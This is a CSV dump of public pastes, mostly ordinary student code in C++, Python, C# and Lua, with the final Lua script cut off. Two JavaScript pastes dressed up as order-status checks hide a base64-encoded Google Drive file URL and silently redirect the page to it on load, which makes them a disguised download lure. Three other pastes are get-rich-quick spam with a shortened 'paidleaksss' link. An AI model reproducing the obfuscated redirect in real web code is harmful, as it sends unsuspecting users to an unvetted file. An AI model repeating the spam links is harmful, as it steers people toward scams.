id,title,username,language,date,content
3nymqjQG,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 12:58:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46495/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KkejyJZi,EARN $900 INSTANTLY 2025 D0,fffcan,JavaScript,Friday 4th of April 2025 12:56:31 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


jlJTZ8famB
"
n0YBdgXK,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 12:55:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/664/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eavFyZ7c,Untitled,Josif_tepe,C++,Friday 4th of April 2025 12:55:07 PM CDT,"#include <iostream>
using namespace std;
 
struct node {
    int info;
    node * next;
    node * prev;
};
struct igrac {
    string ime, prezime;
    int poeni;
};
 
struct DPLista {
    node * head;
    
    void init() {
        head = NULL;
    }
    
    void dodadiPrv(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
        }
    }
    
    void dodadiPosleden(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            node * tmp = head;
            while(tmp->next != NULL) {
                tmp = tmp->next;
            }
            
            tmp->next = new_node;
            new_node->prev = tmp;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                head = head->next;
                delete head->prev;
                head->prev = NULL;
            }
        }
    }
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                node * tmp = head;
                while(tmp->next != NULL) {
                    tmp = tmp->next;
                }
                tmp->prev->next = NULL;
                delete tmp;
                tmp = NULL;
            }
        }
    }
    
    void brishiLista() {
        while(head != NULL) {
            deleteEnd();
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp->info != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    void pechati() {
        node * tmp = head, * last;
        while(tmp != NULL) {
            last = tmp;
            cout << tmp->info << ""->"";
            tmp = tmp -> next;
        }
        cout << endl;
        
        while(last != NULL) {
            cout << last->info << ""<--"";
            last = last->prev;
        }
        cout << endl;
    }
};
void igra(igrac & i1, igrac & i2, DPLista & l1) {
    cout << ""Igrac1: "" << i1.ime << "" "" << i1.prezime << endl;
    node * tmp = l1.head;
    
    string direkcija;
    int cekori;
    
    while(cin >> cekori >> direkcija) {
        if(direkcija == ""l"") {
            while(tmp != NULL and cekori > 0) {
                tmp = tmp->prev;
                cekori--;
            }
            
            if(tmp == NULL) {
                cout << ""GAME OVER! "" << i1.poeni << endl;
                break;
            }
            else {
                i1.poeni += tmp->info;
            }
        }
        else {
            while(tmp != NULL and cekori > 0) {
                tmp = tmp->next;
                cekori--;
            }
            
            if(tmp == NULL) {
                cout << ""GAME OVER! "" << i1.poeni << endl;
                break;
            }
            else {
                i1.poeni += tmp->info;
            }
        }
    }
    
    cout << ""Igrac2: "" << i2.ime << "" "" << i2.prezime << endl;
    node * tmp2 = l1.head;
    while(cin >> cekori >> direkcija) {
        if(direkcija == ""l"") {
            while(tmp2 != NULL and cekori > 0) {
                tmp2 = tmp2->prev;
                cekori--;
            }
            
            if(tmp2 == NULL) {
                cout << ""GAME OVER! "" << i2.poeni << endl;
                break;
            }
            else {
                cout << tmp2->info << endl;

                i2.poeni += tmp2->info;
            }
        }
        else {
            while(tmp2 != NULL and cekori > 0) {
                tmp2 = tmp2->next;
                cekori--;
            }
            
            if(tmp2 == NULL) {
                cout << ""GAME OVER! "" << i2.poeni << endl;
                break;
            }
            else {
                cout << tmp2->info << endl;
                i2.poeni += tmp2->info;
            }
        }
    }
    
    
}

int main()
{
    DPLista l1;
    l1.init();
    igrac i1;
    igrac i2;
    i1.ime = ""Paul"";
    i1.prezime = ""Kalk"";
    i1.poeni = 0;
    i2.ime = ""Jamie"";
    i2.prezime = ""Jones"";
    i2.poeni = 0;
    l1.dodadiPrv(6);
    l1.dodadiPosleden(5);
    l1.dodadiPosleden(2);
    l1.dodadiPosleden(10);
    l1.dodadiPosleden(3);
    l1.dodadiPosleden(0);
    l1.dodadiPosleden(7);
    l1.pechati();
    
    igra(i1, i2, l1);
    
    if (i1.poeni > i2.poeni)
        cout << ""Pobednik e ""<<i1.ime<<"" ""<<i1.prezime<<"" so ""<<i1.poeni<<""poeni"";
    if (i2.poeni > i1.poeni)
        cout << ""Pobednik e ""<<i2.ime<<"" ""<<i2.prezime<<"" so ""<<i2.poeni<<""poeni"";
    if (i1.poeni == i2.poeni)
    {
        cout << ""Dvajcata igraci imaat ist broj na poeni: ""<<i1.ime<<"" ""<<i1.prezime<<"" so ""<<i1.poeni<<""poeni"";
        cout << "" i ""<<i2.ime<<"" ""<<i2.prezime<<"" so ""<<i2.poeni<<""poeni"";
    }
    l1.brishiLista();
}
"
3ebFKs9q,Untitled,Derik_hacker,Python,Friday 4th of April 2025 12:41:03 PM CDT,"from datetime import datetime


nome = input(""Inserisci il tuo nome: "") # ici input nous permet de recuperer le nom de l'utilisateur et le garder dans la variable nom
data_nascita_str = input(""Inserisci la tua data di nascita (formato: YYYY-MM-DD): "") # ici input nous permet de recuperer la date de naissance de l'utilisateur et le garder dans la variable data_nascita_str

#le code qui suit nous permet de verifier si la date de naissance est valide c'est a dire si elle est au format YYYY-MM-DD(annee-mois-jour) 
#si l'utilisateur ne respecte pas ce format, le code entre dans except et affiche un message d'erreur
#par contre si l'utilisateur respecte le format, le code entre dans try et la date de naissance est convertie en un objet datetime
try:
    
    data_nascita = datetime.strptime(data_nascita_str, ""%Y-%m-%d"")

    #datetime.strptime() est une méthode de la classe datetime qui permet de convertir une chaîne de caractères en un objet datetime c'est 
    #c'est a dire sous le format YYYY-MM-DD(annee-mois-jour)
    #la méthode strptime() prend deux arguments: la chaîne de caractères  à convertir (qui est notre variable data_nascita_str)et le format de la chaîne de caractères
except ValueError:
    # ValueError est une exception qui est levée lorsque la conversion échoue
    #cela signifie que la chaîne de caractères ne correspond pas au format spécifié (YYYY-MM-DD)
    #dans ce cas, on affiche un message d'erreur et on quitte le programme
    #exit() est une fonction qui termine le programme
    print(""Formato data non valido. Assicurati di usare YYYY-MM-DD."")
    exit()

#datetime.today() est une méthode de la classe datetime qui renvoie la date et l'heure actuelles sous forme d'objet datetime
#ici on l'utilise pour recuperer la date actuelle et la garder dans la variable oggi
oggi = datetime.today()
#ici en bas je prend l'annee actuelle - l'annee de naissance que l'utilisateur a entré 
#et je soustrait 1 si la date actuelle est prima della data di nascita
#c'est a dire si le mois et le jour de la date actuelle sont inférieurs au mois et au jour de la date de naissance
#cela nous permet de calculer l'âge de l'utilisateur
#en tenant compte de la date actuelle et de la date de naissance

#en quelque sorte je calcule si mon anniversaire est déjà passé ou pas 
#si mon anniversaire est déjà passé, je garde l'age tel quel
#si mon anniversaire n'est pas encore passé, je soustrait 1 à l'age
#et la partie ((oggi.month, oggi.day) < (data_nascita.month, data_nascita.day)) renvoie True vaut 1 ou  False vaut 0
#ce qui nous donne un age correct

eta = oggi.year - data_nascita.year - ((oggi.month, oggi.day) < (data_nascita.month, data_nascita.day))

#ici je verifie si l'age est supérieur ou égal à 18 ans
#si c'est le cas, je dis que l'utilisateur est majeur j'entre dans la première partie de l'instruction if
#sinon je dis que l'utilisateur est mineur j'entre dans le else
if eta >= 18:
    print(f""Ciao {nome}, hai {eta} anni. Sei maggiorenne!"")
else:
    print(f""Ciao {nome}, hai {eta} anni. Sei minorenne!"")
"
yfFMdVnr,Make $1000 15-MINUTES (BEGINNER) RQ,fffcan,JavaScript,Friday 4th of April 2025 12:40:36 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


HMnJQW0q8H
"
vJJBZ1Zw,Console,spah,GetText,Friday 4th of April 2025 12:40:35 PM CDT,"@echo off
exit"
guzN08f6,asd,temposabel,Lua,Friday 4th of April 2025 12:30:32 PM CDT,"DIRECTIONS = {""north"", ""east"", ""south"", ""west""}
NORTH, EAST, SOUTH, WEST, UP, DOWN = 1, 2, 3, 4, 5, 6
DELTA = {vector.new(0, 0, -1), vector.new(1, 0, 0), vector.new(0, 0, 1), vector.new(-1, 0, 0), vector.new(0, 1, 0), vector.new(0, -1, 0)}

BLOCKS_TO_MINE = {
  ""minecraft:diamond_ore"": true,
}

local start_pos = vector.new()  -- FILL IN BEFORE START
local current_direction = NORTH -- FILL IN BEFORE START
local current_pos = start_pos





function info()
  print(""-------------------------"")
  print(""XYZ:"", current_pos.x, ""/"", current_pos.y, ""/"", current_pos.z)
  print(""Facing: ""..DIRECTIONS[current_direction])
  print(""Fuel Level: ""..turtle.getFuelLevel())
  print(""-------------------------"")
end

function calculate_rotation(dir, amount)
  local d = dir - 1
  d = (d + amount) % 4
  return d + 1
end

function rotate_right(amount)
  local amount = amount or 1
  
  for i=1, amount do
    turtle.turnRight()
  end

  current_direction = calculate_rotation(current_direction, amount)
end

function rotate_left(amount)
  local amount = amount or 1

  for i=1, amount do
    turtle.turnLeft()
  end
  
  current_direction = calculate_rotation(current_direction, -amount)
end

function face(direction)
  if current_direction == direction then
    return
  elseif calculate_rotation(current_direction, 1) == direction then
    rotate_right()
  elseif calculate_rotation(current_direction, -1) == direction then
    rotate_left()
  else
    rotate_right(2)
  end
end

function move_forward(amount, dig)
  local amount = amount or 1
  local dig = dig or false
  
  for i=1, amount do
    while turtle.detect() do
      if dig then
        turtle.dig()
      else
        print(""Stepbro I'm Stuck! (in front)"")
      end
    end

    turtle.forward()
    current_pos = current_pos + DELTA[current_direction]
    info()
  end
end

function move_backward(amount, dig)
  rotate_right(2)
  move_forward(amount, dig)
  rotate_left(2)
end

function move_right(amount, dig)
  rotate_right()
  move_forward(amount, dig)
  rotate_left()
end

function move_left(amount, dig)
  rotate_left()
  move_forward(amount, dig)
  rotate_right()
end

function move_up(amount, dig)
  local amount = amount or 1
  local dig = dig or false

  for i=1, amount do
    while turtle.detectUp() do
      if dig then
        turtle.digUp()
      else
        print(""Stepbro I'm Stuck! (above)"")
      end
    end

    turtle.up()
    current_pos = current_pos + DELTA[UP]
    info()
  end
end

function move_down(amount, dig)
  local amount = amount or 1
  local dig = dig or 1

  for i=1, amount do
    while turtle.detectDown() do
      if dig then
        turtle.digDown()
      else
        print(""Stepbro I'm Stuck! (below)"")
      end
    end

    turtle.down()
    current_pos = current_pos + DELTA[DOWN]
    info()
  end
end

function go_down_to(level)
  for i=0,level do
    turtle.digDown()
    turtle.down()
  end
end

function manhattan_distance(pos1, pos2)
  return math.abs(pos1.x - pos2.x) + math.abs(pos1.y - pos2.y) + math.abs(pos1.z - pos2.z)
end

function get_available_fuel()
  local available_fuel = turtle.getFuelLevel()

  for i=1, 16 do
    local item = turtle.getItemDetail(i)

    if item and item.name == ""minecraft:coal"" then
      available_fuel = available_fuel + item.count * 80
    end
  end
  
  return available_fuel
end

function has_ore_in_vicinity()
  blocks = {}
  
  table.insert(blocks,turtle.inspectDown()[2].name)
  table.insert(blocks,turtle.inspectUp()[2].name)

  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnLeft()
  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnRight(2)
  table.insert(blocks,turtle.inspect()[2].name)
  turtle.turnLeft()

  for _, block in ipairs(blocks) do
    if BLOCKS_TO_MINE[block] ~= nil do
      return true
    end
  end
  
  return false
end

function mine_vein(depth, visited)
  local visited = visited or {}
  if depth == 0 then return end

  local local_start_dir = current_direction

  -- Forward/Backward/Left/Right
  for i=0, 3 do
    local new_dir = calculate_rotation(local_start_dir, i)
    local block = (current_pos + DELTA[new_dir]):tostring()

    if visited[block] == nil then
      visited[block] = true

      face(new_dir)

      local not_air, block_data = table.unpack(turtle.inspect())
      if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
        move_forward(1, true)
        mine_vein(depth - 1, visited)
        face(calculate_rotation(new_dir, 2))
        move_forward(1, true)
      end
    end
  end

  -- Up/Down
  local block = (current_pos + DELTA[UP]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = table.unpack(turtle.inspectUp())
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_up(1, true)
      mine_vein(depth - 1, visited)
      move_down(1, true)
    end
  end

  local block = (current_pos + DELTA[DOWN]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = table.unpack(turtle.inspectDown())
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_down(1, true)
      mine_vein(depth - 1, visited)
      move_up(1, true)
    end
  end
end

"
a5ED8VTg,Untitled,Josif_tepe,C++,Friday 4th of April 2025 12:28:02 PM CDT,"#include <iostream>
using namespace std;
const int maxn = 1000;
 
struct stackk {
    int niza[maxn];
    int idx;
    
    void init() {
        idx = -1;
    }
    
    void push(int x) {
        if(idx + 1 >= maxn) {
            cout << ""NEMA DOVOLNO KAPACITET"" << endl;
            return;
        }
        idx++;
        niza[idx] = x;
    }
    
    int pop() {
        if(idx == -1) {
            cout << ""NEMA NITU EDEN ELEMENT VO STEKOT"" << endl;
            return -1;
        }
        int result = niza[idx];
        idx--;
        return result;
    }
    
    int top() {
        if(idx == -1) {
            cout << ""NEMA NITU EDEN ELEMENT VO STEKOT"" << endl;
            return -1;
        }
        return niza[idx];
    }
    
    int size() {
        return idx + 1;
    }
    
    int isEmpty() {
        if(idx == -1) {
            return 1;
        }
        else {
            return 0;
        }
    }
};

void promeni(stackk & m1) {
    stackk m2;
    m2.init();
    
    while(m1.isEmpty() == false) {
        m2.push(m1.pop());
    }
    
    stackk nad;
    nad.init();
    
    while(m2.isEmpty() == false) {
        int c = m2.pop();
        
        if(nad.isEmpty() == false) {
            if(c % nad.top() == 0) {
                m1.push(c / nad.top());
            }
        }
        nad.push(c);
        
        if(m2.isEmpty() == false) {
            if(c % m2.top() == 0) {
                m1.push(c / m2.top());
            }
        }
    }
}
int main() {
    stackk m1;

    m1.init();

    m1.push(2);
    m1.push(10);
    m1.push(5);
    m1.push(2);
    m1.push(1);

    promeni(m1);

    while (!m1.isEmpty()) {
        cout << m1.pop() << endl;
    }

    return 0;
}
"
pMPiYkB4,EARN $900 INSTANTLY 2025 V9,fffcan,JavaScript,Friday 4th of April 2025 12:24:41 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


AJIjja0R39
"
5798yyWL,#50,vovanhik_24,C#,Friday 4th of April 2025 12:19:28 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace CarService
{
    public class Program
    {
        static void Main(string[] args)
        {
            AutoService service = new AutoService();
            service.Run();
        }
    }

    public class Detail
    {
        public Detail(string name, decimal price, bool isBroken)
        {
            Name = name;
            Price = price;
            IsBroken = isBroken;
        }

        public string Name { get; private set; }
        public decimal Price { get; private set; }
        public bool IsBroken { get; private set; }
    }

    public class DetailStorage
    {
        public DetailStorage(Detail detail, int amount = 1)
        {
            Detail = detail;
            Amount = amount;
        }

        public Detail Detail { get; private set; }
        public int Amount { get; private set; }

        public int SetAmount(int amount)
        {
            return Amount += amount;
        }
    }

    public class AutoServiceStorage
    {
        private readonly List<DetailStorage> _partsInStock;

        public AutoServiceStorage()
        {
            _partsInStock = new List<DetailStorage>
            {
                new DetailStorage(new Detail(""Двигатель"", 5000, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Тормоза"", 1200, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Фара"", 800, false), UserUtils.GenerateRandom(10)),
                new DetailStorage(new Detail(""Аккумулятор"", 2500, false), UserUtils.GenerateRandom(10))
            };
        }

        public bool PartsInStock(string partName)
        {
            DetailStorage StorageItem = _partsInStock.FirstOrDefault(i => i.Detail.Name == partName);

            if (StorageItem == null || StorageItem.Amount <= 0)
            {
                Console.WriteLine($""Нет нужной детали: {partName}"");
                return false;
            }

            return true;
        }

        public bool DecreasePartAmount(string partName)
        {
            DetailStorage StorageItem = _partsInStock.FirstOrDefault(i => i.Detail.Name == partName);

            if (StorageItem != null && StorageItem.Amount > 0)
            {
                StorageItem.SetAmount(-1);
                return true;
            }

            return false;
        }

        public List<DetailStorage> GetAllParts()
        {
            return _partsInStock;
        }
    }

    public class Car
    {
        public Car(string model, List<Detail> detail)
        {
            Model = model;
            Detail = detail;
            IsRepairStarted = false;
        }

        public string Model { get; private set; }
        public List<Detail> Detail { get; private set; }
        public bool IsRepairStarted { get; private set; }

        public List<Detail> GetBrokenParts()
        {
            return Detail.Where(i => i.IsBroken).ToList();
        }

        public bool IsFullyRepaired()
        {
            return !Detail.Any(i => i.IsBroken);
        }

        public void StartRepair()
        {
            IsRepairStarted = true;
        }

        public bool ReplacePart(Detail newPart)
        {
            Detail brokenPart = Detail.FirstOrDefault(i => i.Name == newPart.Name);

            if (brokenPart != null)
            {
                Detail.Remove(brokenPart);
                Detail.Add(newPart);

                return true;
            }

            return false;
        }
    }

    public class CarCreator
    {
        private readonly List<Car> _cars;

        public CarCreator()
        {
            _cars = new List<Car>
            {
                new Car(""Toyota"", new List<Detail>
                {
                    new Detail(""Двигатель"", 500m, true),
                    new Detail(""Фара"", 100m, true),
                    new Detail(""Тормоза"", 150m, false)
                }),
                new Car(""Honda"", new List<Detail>
                {
                    new Detail(""Аккумулятор"", 500m, true),
                    new Detail(""Двигатель"", 100m, false)
                })
            };
        }

        public List<Car> GetCars()
        {
            return _cars;
        }
    }

    public class AutoService
    {
        private const decimal RepairFEE = 1000;
        private const decimal CancelBeforeRepairFee = 2000;
        private const decimal CancelDuringRepairFeePerPart = 600;

        private readonly CarCreator _carCreator;
        private readonly Queue<Car> _cars;
        private readonly AutoServiceStorage _storage;
        private decimal _balance;

        public AutoService()
        {
            _cars = new Queue<Car>();
            _carCreator = new CarCreator();
            _storage = new AutoServiceStorage();
            _balance = UserUtils.GenerateRandom(10000);

            AddCarsToQueue();
        }

        public void Run()
        {
            const string CommandToRepair = ""1"";
            const string CommandToCancelRepair = ""2"";
            const string CommandToExit = ""3"";

            bool isWorking = true;

            while (isWorking && _cars.Count > 0 && _balance > 0)
            {
                Console.Clear();
                ShowServiceStatus();

                Car currentCar = _cars.Peek();

                Console.WriteLine($""\nТекущая машина: {currentCar.Model}"");
                ShowBrokenParts(currentCar);

                Console.WriteLine(""\nВыберите действие:"");
                Console.WriteLine(""1 - Отремонтировать деталь"");
                Console.WriteLine(""2 - Отказаться от ремонта"");
                Console.WriteLine(""3 - Выйти"");

                Console.Write(""Введите номер команды: "");
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandToRepair:
                        Console.Write(""Введите название детали для ремонта: "");
                        string partName = Console.ReadLine();

                        RepairPart(currentCar, partName);
                        Pause();
                        break;

                    case CommandToCancelRepair:
                        CancelRepair(currentCar);
                        Pause();
                        break;

                    case CommandToExit:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод"");
                        Pause();
                        break;
                }
            }

            Console.WriteLine(""\nРабота сервиса завершена."");
            Console.WriteLine($""Итоговый баланс: {_balance}"");
        }

        private void Pause()
        {
            Console.WriteLine(""\nНажмите любую клавишу для продолжения..."");
            Console.ReadKey();
        }

        private void AddCarsToQueue()
        {
            List<Car> cars = _carCreator.GetCars();

            foreach (Car car in cars)
            {
                _cars.Enqueue(car);
                Console.WriteLine($""Машина {car.Model} добавлена в очередь"");
            }
        }

        private void ShowBrokenParts(Car car)
        {
            List<Detail> brokenParts = car.GetBrokenParts();
            Console.WriteLine($""Сломанные детали в {car.Model}:"");

            foreach (Detail part in brokenParts)
            {
                Console.WriteLine($""- {part.Name} (Цена: {part.Price})"");
            }

            if (brokenParts.Count == 0)
            {
                Console.WriteLine(""Все детали исправны."");
            }
        }

        private void CancelRepair(Car car)
        {
            decimal penalty;

            if (car.IsRepairStarted == false)
            {
                penalty = CancelBeforeRepairFee;
                Console.WriteLine($""В ремонте было отказано. Штраф за отказ от услуг: {penalty}"");
            }
            else
            {
                int brokenPartsCount = car.GetBrokenParts().Count;
                penalty = brokenPartsCount * CancelDuringRepairFeePerPart;

                Console.WriteLine($""Отказ от ремонта во время работы. Штраф: {penalty} ({brokenPartsCount} сломанных деталей)"");
            }

            _balance -= penalty;
            RemoveCarQueue(car);
        }

        private bool RepairPart(Car car, string partName)
        {
            car.StartRepair();

            List<Detail> brokenParts = car.GetBrokenParts();
            Detail partToRepair = brokenParts.FirstOrDefault(i => i.Name.Equals(partName, StringComparison.OrdinalIgnoreCase));

            if (partToRepair == null)
            {
                Console.WriteLine($""Деталь {partName} не сломана или не существует"");
                return false;
            }

            if (!_storage.PartsInStock(partName))
            {
                Console.WriteLine($""Нет нужной детали на складе: {partName}"");
                return false;
            }

            Detail newPart = new Detail(partName, partToRepair.Price, false);

            if (car.ReplacePart(newPart))
            {
                _storage.DecreasePartAmount(partName);

                _balance += partToRepair.Price + RepairFEE;
                Console.WriteLine($""Деталь {partName} заменена. Прибыль: {partToRepair.Price + RepairFEE}"");

                if (car.IsFullyRepaired())
                {
                    RemoveCarQueue(car);
                    Console.WriteLine($""Машина {car.Model} полностью отремонтирована и удалена из очереди"");
                }

                return true;
            }

            return false;
        }

        private void ShowServiceStatus()
        {
            Console.WriteLine($""\nТекущий баланс: {_balance}"");

            Console.WriteLine(""\nМашины в очереди:"");
            if (_cars.Count == 0)
            {
                Console.WriteLine(""Очередь пуста."");
            }
            else
            {
                foreach (Car car in _cars)
                {
                    Console.WriteLine($""- {car.Model} (Сломанных деталей: {car.GetBrokenParts().Count})"");
                }
            }

            Console.WriteLine(""\nДетали на складе:"");
            foreach (DetailStorage part in _storage.GetAllParts())
            {
                Console.WriteLine($""- {part.Detail.Name}: {part.Amount} шт. (Цена: {part.Detail.Price})"");
            }
        }

        private void RemoveCarQueue(Car car)
        {
            Queue<Car> newQueue = new Queue<Car>(_cars.Where(i => i != car));
            _cars.Clear();

            foreach (Car i in newQueue)
            {
                _cars.Enqueue(i);
            }
        }
    }

    class UserUtils
    {
        private static Random s_random = new Random();

        public static int GenerateRandom(int maxValue)
        {
            return s_random.Next(0, maxValue + 1);
        }

        public static int GenerateRandom(int minValue, int maxValue)
        {
            return s_random.Next(minValue, maxValue + 1);
        }

        public static int BaseRandomGenerator(int maxValue)
        {
            return s_random.Next(0, maxValue);
        }

        public static int BaseRandomGenerator(int minValue, int maxValue)
        {
            return s_random.Next(minValue, maxValue);
        }
    }
}"
crexyivH,Basic multithreading c++,Oppenheimer,C++,Friday 4th of April 2025 12:19:17 PM CDT,"#include<iostream>
#include<thread>
#include<ctime>
#include<mutex>
#include<bits/stdc++.h>

// 
//https://www.youtube.com/watch?v=13dFggo4t_I&list=PL5jc9xFGsL8E12so1wlMS0r0hTQoJL74M&index=6
// 

using namespace std;

mutex carMutex;
mutex mux;

void function1(char symbol){
    carMutex.lock();

    

    for(int i=0;i<200;i++){
        cout << symbol;
    }

    carMutex.unlock();
}

void function2(){

    unique_lock<mutex> carLock(carMutex);
    
    carLock.try_lock();

    carLock.try_lock_for(500ns);


    for(int i=0;i<200;i++){
        cout << ""- "";
    }
    this_thread::sleep_for(2000ms);

    this_thread::get_id();


    carLock.unlock();
}

void func3(){

    // automatically unlocks when variable goes out of scope
    lock_guard<mutex> guardLock(mux);

    cout << ""Hello"" <<endl;

}

int main(){

    time_t currentTime = time(nullptr);
    cout << currentTime << endl;

    thread worker1(function1, ')');

    thread worker2(function2);

    if(worker1.joinable()){
        worker1.join(); 
    }

    // shifting ownership of thread
    thread t3 = move(worker1);

    worker2.detach();

    // returns no of cores in system, optimal -> no of threads = no of cores
    hardware_concurrency();


    return 0;

}


"
FQrkcH20,modem testing receiver,Incomprehensible,Lua,Friday 4th of April 2025 12:18:56 PM CDT,"local monitor = peripheral.find(""monitor"")
local modem = peripheral.find(""modem"", rednet.open) -- doing it like this finds all modem peripherals and then opens rednet on them
local tPos
--- MAIN
monitor.clear()
monitor.setCursorPos(1,1)
monitor.setTextScale(0.5)
monitor.write(""Hello, ID: "" .. os.computerID()) --the id of the computer

function vec3ToString(vec3)
	local str = (""(x:"" .. math.floor(vec3.x+0.5) .. "", y:"" .. math.floor(vec3.y+0.5) .. "", z:"" .. math.floor(vec3.z+0.5) .. "")"")
	return str
end

function receivePosMessage()
	local id, message = rednet.receive(nil,0.5)
	if (message == nil) then return end
	monitor.clear()
	monitor.setCursorPos(1,1)
	monitor.write(""Message from ID: "" .. id .. "" = "" .. vec3ToString(message))
	tPos = message

end

function update()
	receivePosMessage()
end

while true do
	sleep(0.5)
	update()
end"
JPc9Y4n1,Twitch_chat_pickle,ZeProf2ModsYTB,Lua,Friday 4th of April 2025 12:15:46 PM CDT,"CHATROOM = ""picklelizcious""
SUBSONLY = false
CLEAR_MESSAGES = true

local expect = require ""cc.expect""
local expect, field = expect.expect, expect.field

local type, getmetatable, setmetatable, colours, str_write, tostring = type, getmetatable, setmetatable, colours, write, tostring
local debug_info = type(debug) == ""table"" and type(debug.getinfo) == ""function"" and debug.getinfo
local debug_local = type(debug) == ""table"" and type(debug.getlocal) == ""function"" and debug.getlocal

--- @{table.insert} alternative, but with the length stored inline.
local function append(out, value)
    local n = out.n + 1
    out[n], out.n = value, n
end

--- A document containing formatted text, with multiple possible layouts.
--
-- Documents effectively represent a sequence of strings in alternative layouts,
-- which we will try to print in the most compact form necessary.
--
-- @type Doc
local Doc = { }

--- An empty document.
local empty = setmetatable({ tag = ""nil"" }, Doc)

--- A document with a single space in it.
local space = setmetatable({ tag = ""text"", text = "" "" }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{empty}.
local line = setmetatable({ tag = ""line"", flat = empty }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{space}.
local space_line = setmetatable({ tag = ""line"", flat = space }, Doc)

local text_cache = { [""""] = empty, ["" ""] = space, [""\n""] = space_line }

local function mk_text(text, colour)
    return text_cache[text] or setmetatable({ tag = ""text"", text = text, colour = colour }, Doc)
end

--- Create a new document from a string.
--
-- If your string contains multiple lines, @{group} will flatten the string
-- into a single line, with spaces between each line.
--
-- @tparam      string text   The string to construct a new document with.
-- @tparam[opt] number colour The colour this text should be printed with. If not given, we default to the current
-- colour.
-- @treturn Doc The document with the provided text.
-- @usage Write some blue text.
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.text(""Hello!"", colours.blue))
local function text(text, colour)
    expect(1, text, ""string"")
    expect(2, colour, ""number"", ""nil"")

    local cached = text_cache[text]
    if cached then return cached end

    local new_line = text:find(""\n"", 1)
    if not new_line then return mk_text(text, colour) end

    -- Split the string by ""\n"". With a micro-optimisation to skip empty strings.
    local doc = setmetatable({ tag = ""concat"", n = 0 }, Doc)
    if new_line ~= 1 then append(doc, mk_text(text:sub(1, new_line - 1), colour)) end

    new_line = new_line + 1
    while true do
        local next_line = text:find(""\n"", new_line)
        append(doc, space_line)
        if not next_line then
